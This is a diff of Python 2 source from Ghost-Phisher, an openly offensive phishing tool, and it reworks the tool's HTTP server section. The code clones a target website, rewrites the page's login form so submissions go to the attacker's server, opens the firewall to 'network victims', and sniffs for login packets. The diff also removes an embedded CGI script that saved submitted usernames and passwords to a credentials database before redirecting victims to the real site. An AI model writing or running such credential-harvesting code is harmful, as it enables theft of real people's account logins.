-            real_website_address = str(self.real_website_address.text())        # The IP address or the real url address of the cloned website
-            if 'website_url.log' in os.listdir('/tmp/'):
-                os.remove('/tmp/website_url.log')
-            real_website_log = open('/tmp/website_url.log','a+')                # Log the real website address or IP address for cgi script
-            real_website_log.write(real_website_address)
-            real_website_log.close()
-            create_settings('self.real_website_address',real_website_address)
+        if 'HTTP-Webscript' in os.listdir(cwd):     # Create web directory if it does not exist
+            commands.getstatusoutput('rm -r ' + cwd + '/HTTP-Webscript')
+        os.mkdir(cwd + '/HTTP-Webscript')
+        os.mkdir(cwd + '/HTTP-Webscript'+ os.sep + 'cgi-bin')        # Create (cgi-bin) directory for login handler
 
-            if 'HTTP-Webscript' in os.listdir(cwd):     # Create web directory if it does not exist
-                commands.getstatusoutput('rm -r ' + cwd + '/HTTP-Webscript')
-            os.mkdir(cwd + '/HTTP-Webscript')
-            os.mkdir(cwd + '/HTTP-Webscript'+ os.sep + 'cgi-bin')        # Create (cgi-bin) directory for login handler
-
-            if 'Ghost-Phisher-Database' not in os.listdir(cwd): # Create Database directory
-                os.mkdir('Ghost-Phisher-Database')
+        if 'Ghost-Phisher-Database' not in os.listdir(cwd): # Create Database directory
+            os.mkdir('Ghost-Phisher-Database')
 
 
 
-            if self.select_website_radio.isChecked() == True:
-                web_script = str(self.website_linedit.text())
-                if web_script == '':
-                    QtGui.QMessageBox.warning(self,"Invalid Web-Script","Please browse and select a web-script to host from the (Select Webpage:) section")
+        if self.select_website_radio.isChecked() == True:
+            web_script = str(self.website_linedit.text())
+            if web_script == '':
+                http_error += 1
+                QtGui.QMessageBox.warning(self,"Invalid Web-Script","Please browse and select a web-script to host from the (Select Webpage:) section")
+            else:
+                self.status_textbrowser_http.append('<font color=green>Starting HTTP Server...</font>')
+
+                html_process = web_script.replace(os.sep,'\n')      # This section moves the Web script and its files to the HTTP Webscript directory
+                html_file = html_process.splitlines()[-1]           # Holds file name like (index.html)
+
+                html_name_process = html_file.replace('.','\n').splitlines()
+                html_name = html_name_process[0]
+
+                html_file_folder = ''                               # Holds folder name like (index_files)
+
+                for files in os.listdir(web_script.replace(html_file,'')):  # Iterates over the directory where html file is situated
+                    if html_name in files:
+                        if files != html_file:
+                            html_file_folder += files
+
+                if html_name in html_file_folder:
+                    html_file_folder_path = web_script.replace(html_file,html_file_folder)
                 else:
-                    self.status_textbrowser_http.append('<font color=green>Starting HTTP Server...</font>')
+                    html_file_folder_path = ''
 
-                    html_process = web_script.replace(os.sep,'\n')      # This section moves the Web script and its files to the HTTP Webscript directory
-                    html_file = html_process.splitlines()[-1]           # Holds file name like (index.html)
+                webserver_path = cwd + os.sep + 'HTTP-Webscript' + os.sep
 
-                    html_name_process = html_file.replace('.','\n').splitlines()
-                    html_name = html_name_process[0]
+                response = commands.getstatusoutput('cp -r %s %s \n cp -r %s %s'%(web_script,webserver_path,\
+                                                                              html_file_folder_path,webserver_path))
 
-                    html_file_folder = ''                               # Holds folder name like (index_files)
-
-                    for files in os.listdir(web_script.replace(html_file,'')):  # Iterates over the directory where html file is situated
-                        if html_name in files:
-                            if files != html_file:
-                                html_file_folder += files
-
-                    if html_name in html_file_folder:
-                        html_file_folder_path = web_script.replace(html_file,html_file_folder)
-                    else:
-                        html_file_folder_path = ''
-
-                    webserver_path = cwd + os.sep + 'HTTP-Webscript' + os.sep
-
-                    response = commands.getstatusoutput('cp -r %s %s \n cp -r %s %s'%(web_script,webserver_path,\
-                                                                                  html_file_folder_path,webserver_path))
-
-                    try:
-                        os.rename('%s/HTTP-Webscript/%s'%(cwd,html_file),'%s/HTTP-Webscript/index.html'%(cwd))               # rename our webscript to what the web server can host
-                        if response[0] != 0:
-                            if html_file_folder == '':
-                                self.status_textbrowser_http.append('<font color=green>Moving webscript files to Web-Server directory...</font>')
-                                self.status_textbrowser_http.append('<font color=green>Generating CGI script for handling POST request</font>')
-                            else:
-                                self.status_textbrowser_http.append('<font color=red>Failed to move webscript files to Web-Server directory: %s</font>'%(response[1]))
-                        else:
-                            self.status_textbrowser_http.append('<font color=green>Moving webcript files to Web-Server directory...</font>')
+                try:
+                    os.rename('%s/HTTP-Webscript/%s'%(cwd,html_file),'%s/HTTP-Webscript/index.html'%(cwd))               # rename our webscript to what the web server can host
+                    if response[0] != 0:
+                        if html_file_folder == '':
+                            self.status_textbrowser_http.append('<font color=green>Moving webscript files to Web-Server directory...</font>')
                             self.status_textbrowser_http.append('<font color=green>Generating CGI script for handling POST request</font>')
+                        else:
+                            self.status_textbrowser_http.append('<font color=red>Failed to move webscript files to Web-Server directory: %s</font>'%(response[1]))
+                            http_error += 1
+                    else:
+                        self.status_textbrowser_http.append('<font color=green>Moving webcript files to Web-Server directory...</font>')
 
-                    except OSError,e:
-                        self.status_textbrowser_http.append('<font color=red>Unable to start HTTP Server: %s</font>'%(e))
+                except OSError,e:
+                    self.status_textbrowser_http.append('<font color=red>Unable to start HTTP Server: %s</font>'%(e))
+                    http_error += 1
 
+        else:
+            website_url = str(self.emulate_website_label.text())
+            if len(website_url) > 7:
+                self.status_textbrowser_http.append('<font color=green>Starting HTTP Server...</font>')
+                commands.getstatusoutput('rm -r ' + cwd + os.sep + 'HTTP-Webscript') # Remove old html files already there
+                os.mkdir(cwd + '/HTTP-Webscript')
+                os.mkdir(cwd + '/HTTP-Webscript'+ os.sep + 'cgi-bin')
+                try:
+                    url_source = urllib2.urlopen(website_url)                    # Get the source code of the website and write an HTML file of the website
+                    web_script = open('HTTP-Webscript/index.html','a+')
+                    web_script.write(url_source.read())
+                    self.status_textbrowser_http.append('<font color=green>Successfully cloned %s</font>'%(website_url))
+                    web_script.close()
+                except(urllib2.URLError):
+                    self.status_textbrowser_http.append('<font color=red>Unable to fetch and clone website: network timeout</font>')
             else:
-                website_url = str(self.emulate_website_label.text())
-                if len(website_url) > 7:
-                    self.status_textbrowser_http.append('<font color=green>Starting HTTP Server...</font>')
-                    commands.getstatusoutput('rm -r ' + cwd + os.sep + 'HTTP-Webscript') # Remove old html files already there
-                    os.mkdir(cwd + '/HTTP-Webscript')
-                    os.mkdir(cwd + '/HTTP-Webscript'+ os.sep + 'cgi-bin')
-                    try:
-                        url_source = urllib2.urlopen(website_url)                    # Get the source code of the website and write an HTML file of the website
-                        web_script = open('HTTP-Webscript/index.html','a+')
-                        web_script.write(url_source.read())
-                        self.status_textbrowser_http.append('<font color=green>Successfully cloned %s</font>'%(website_url))
-                        web_script.close()
-                        self.status_textbrowser_http.append('<font color=green>Generating CGI script for handling POST request</font>')
-                    except(urllib2.URLError):
-                        self.status_textbrowser_http.append('<font color=red>Unable to fetch and clone website: network timeout</font>')
-                else:
-                    QtGui.QMessageBox.warning(self,"Invalid URL","Please input a valid url to the (Clone Website:) text area \n e.g http://www.foo-bar.com")
+                QtGui.QMessageBox.warning(self,"Invalid URL","Please input a valid url to the (Clone Website:) text area \n e.g http://www.foo-bar.com")
 
             #
-            # Generating pythonic CGI script for POST HTTP requests
+            # Giving the file and Database directory run permission, else HTTP server will not submit any POST request
             #
-            if self.autogen_cgi_radio.isChecked() == True:
-                if 'login' in os.listdir('%s/HTTP-Webscript/cgi-bin/'%(cwd)):
-                    os.remove('%s/HTTP-Webscript/cgi-bin/login'%(cwd))
+            os.chmod('%s/Ghost-Phisher-Database'%(cwd),0777)
 
-                python_cgi_script = open('%s/HTTP-Webscript/cgi-bin/login'%(cwd),'a+')
-                python_cgi_script.write('''#!/usr/bin/python
-
-import os
-import cgi
-import sqlite3
-
-form = cgi.FieldStorage()
-
-database_path = os.getcwd().replace('HTTP-Webscript','Ghost-Phisher-Database')
-
-real_website_url = open('/tmp/website_url.log')
-website_name =  real_website_url.read() #Real websites address
-real_website_url.close()
-
-def database_insert(website_name,form_key,form_value):
-        database = sqlite3.connect('%s/database.db'%(database_path))
-        query_database = database.cursor()
-        if website_name != None:
-           query_database.execute("insert into credentials values (%s,%s,%s)"%(repr(website_name),repr(form_key),repr(form_value)))
-
-        query_database.execute('create table if not exists credentials (website text, username text, password text)')
-	database.commit()
-        database.close()
-
-
-database_insert(None,None,None)                     # This creates database with its tables
-
-
-for form_variable in form:
-    if len(form.getvalue(form_variable)) > 3:
-        if type(form.getvalue(form_variable)) == str:
-            database_insert(website_name,form_variable,form.getvalue(form_variable)) #Adds data to database file
-
-
-form = open('/tmp/new_connection.log','a+')         # New connection to notify main program
-form.write(" 1 ")
-form.close()
-
-
-# Redirect to the original website
-
-print("""
-<head>
-<title></title>
-<FRAMESET cols="*">
-  <FRAME SRC="http://%s">
-
-
-</FRAMESET>";?>
-"""%(website_name))
-                                    ''')    # Pythonic CGI script for handling POST Requests
-                #
-                # Giving the file and Database directory run permission, else HTTP server will not submit any POST request
-                #
-                os.chmod('%s/HTTP-Webscript/cgi-bin/login'%(cwd),0777)
-                os.chmod('%s/Ghost-Phisher-Database'%(cwd),0777)
+        if dns_contol == 0:
+            if http_server_port == 80:
+                http_address = 'http://%s/'%(str(self.lineEdit_2.text()))  # If DNS is activated then give e.g http://www.foo-bar/ instead of http://192.168.0.23/
             else:
-                # User defined CGI Script handler
-                users_cgi_script = str(self.lineEdit_10.text())
-                if len(users_cgi_script) < 3:
-                    QtGui.QMessageBox.warning(self,"Invalid CGI Script","Please input a valid Python CGI script to handle POST login requests")
-                    self.status_textbrowser_http.append('<font color=red>Failed to start HTTP Server: Insufficient arguement</font>')
-                else:
-                    user_cgi = open(users_cgi_script)
-                    user_cgi_process = user_cgi.read()
-                    user_cgi_create_login = open('%s/HTTP-Webscript/cgi-bin/login'%(cwd),'a+')
-                    user_cgi_create_login.write(user_cgi_process)
-                    user_cgi.close()
-                    user_cgi_create_login.close()
+                http_address = 'http://%s:%s/'%(str(self.lineEdit_2.text(),http_server_port))    # Evaluate server address e,g http://192.168.0.23:8080/
 
-                    self.status_textbrowser_http.append('<font color=green>Using user defined CGI script for handling POST request</font>')
+        else:
+            actions_ip_address = str(self.http_ip_combo.currentText())
+            if http_server_port == 80:
+                http_address = 'http://%s/'%(actions_ip_address)  # If DNS is activated then give e.g http://www.foo-bar/ instead of http://192.168.0.23/
+            else:
+                http_address = 'http://%s:%s/'%(actions_ip_address,http_server_port)    # Evaluate server address e,g http://192.168.0.23:8080/
 
-                    os.chmod('%s/HTTP-Webscript/cgi-bin/login'%(cwd),0777)
-                    os.chmod('%s/Ghost-Phisher-Database'%(cwd),0777)
-
-
-
+        if self.capture_radio.isChecked() == True:                          # Capture Mode is enabled
             html_file = open('%s/HTTP-Webscript/index.html'%(cwd))
             html_source = html_file.read()
 
@@ -2363,45 +2327,38 @@ print("""
 
             action_string = index_forms_end[0:index_form_length]
 
-            actions_ip_address = str(self.http_ip_combo.currentText())                  # The http's current combo address
-
-
-            if dns_contol == 0:
-                if http_server_port == 80:
-                    http_address = 'http://%s/'%(str(self.real_website_address.text()))  # If DNS is activated then give e.g http://www.foo-bar/ instead of http://192.168.0.23/
-                else:
-                    http_address = 'http://%s:%s/'%(str(self.real_website_address.text(),http_server_port))    # Evaluate server address e,g http://192.168.0.23:8080/
-
-            else:
-                if http_server_port == 80:
-                    http_address = 'http://%s/'%(actions_ip_address)  # If DNS is activated then give e.g http://www.foo-bar/ instead of http://192.168.0.23/
-                else:
-                    http_address = 'http://%s:%s/'%(actions_ip_address,http_server_port)    # Evaluate server address e,g http://192.168.0.23:8080/
-
-
-
-            new_post_action = html_source.replace(action_string,"action=" + http_address + "cgi-bin/login") # Replaces action variable with ours e.g <action="http://192.168.0.23/cgi-bin/login">
+            new_post_action = html_source.replace(action_string,"action=" + http_address) # Replaces action variable with ours e.g <action="http://192.168.0.23/cgi-bin/login">
+            create_settings('self.lineEdit_2',str(self.lineEdit_2.text()))
             #
             # Check if html source has a valid Post action method
             #
-            if 'action' in html_source:
-                os.remove('%s/HTTP-Webscript/index.html'%(cwd))                     # Remove index script
-                new_html_file = open('%s/HTTP-Webscript/index.html'%(cwd),'a+')     # Rewrite to incude our new action url
-                new_html_file.write(new_post_action)
-                new_html_file.close()
-            else:                                                                   #   This conditional statement will be changed in the future
-                self.status_textbrowser_http.append('<font color=red>Source page does not have any html post action method, Serving... normal page<font>')
 
-            thread.start_new_thread(self.HTTP_Server,(http_server_port,0))      # Starts the HTTP Server
+            os.remove('%s/HTTP-Webscript/index.html'%(cwd))                     # Remove index script
+            new_html_file = open('%s/HTTP-Webscript/index.html'%(cwd),'a+')     # Rewrite to incude our new action url
+            new_html_file.write(new_post_action)
+            new_html_file.close()
 
-            commands.getstatusoutput('iptables -I INPUT -p tcp --dport %d -j ACCEPT'%(int(http_server_port))) # Allows full communication with network victims
+            self.status_textbrowser_http.append('<font color=green>Sniffing http port for possible login packets')
 
+        else:                                                              # Hosting Mode is enabled
+            self.status_textbrowser_http.append('<font color=green>Website Hosting activated</font>')
+
+
+
+        if http_error == 0:      # Means that we hitted this block without any errors from the others
             self.http_start.setEnabled(False)
             self.http_stop.setEnabled(True)
             self.http_captured_credential.setText('captured credentials:')
             self.http_port_label.setText('<font color=green>TCP Port:</font> %s'%(http_server_port))
             self.http_ip_label.setText('<font color=green>Service running on:</font>  %s'%(actions_ip_address))
             self.label_13.setText('<font color=green>Runtime:</font>  %s'%(time.ctime()))
+
+            http_working_directory = cwd + os.sep + 'HTTP-Webscript'            # e.g /root/Desktop/HTTP-Webscript
+
+            thread.start_new_thread(self.HTTP_Server,(http_server_port,http_working_directory))      # Starts the HTTP Server
+
+
+
 
             if http_server_port == 80:
                 http_address = 'http://%s/'%(actions_ip_address)
@@ -2410,7 +2367,10 @@ print("""
                 http_address = 'http://%s:%s/'%(actions_ip_address,http_server_port)
                 self.status_textbrowser_http.append('<font color=green>HTTP Server running on: %s</font>'%(http_address))
 
-            thread.start_new_thread(self.auto_check_thread,())                  # Runs the thread loop that checks for new inputs to database
+            thread.start_new_thread(self.http_update_thread,())                  # Runs the thread loop that checks for new inputs to database
+            self.status_textbrowser_http.append('')
+
+
 
 
 
@@ -2488,21 +2448,6 @@ print("""
             pass
 
 
-    def auto_check_thread(self):
-        ''' This thread checks the '/tmp/new_connection.log'
-            file for newly inputted data
-        '''
-        global http_control
-        global captured_credential
-
-        while http_control == 0:
-            time.sleep(5)
-            credentials = open('/tmp/new_connection.log','r')
-            credential_numbers = credentials.read().count('1')
-            credentials.close()
-            if credential_numbers != captured_credential:
-                captured_credential += 1
-                self.emit(QtCore.SIGNAL("new credential"))
 
 
 
@@ -2520,6 +2465,7 @@ print("""
         if answer == QtGui.QMessageBox.Yes:
             if dns_contol == 0:
                 self.stop_dns()
+            commands.getstatusoutput('killall mini-httpd')
             try:
                 commands.getstatusoutput('killall airbase-ng')
                 self.stop_dhcp()
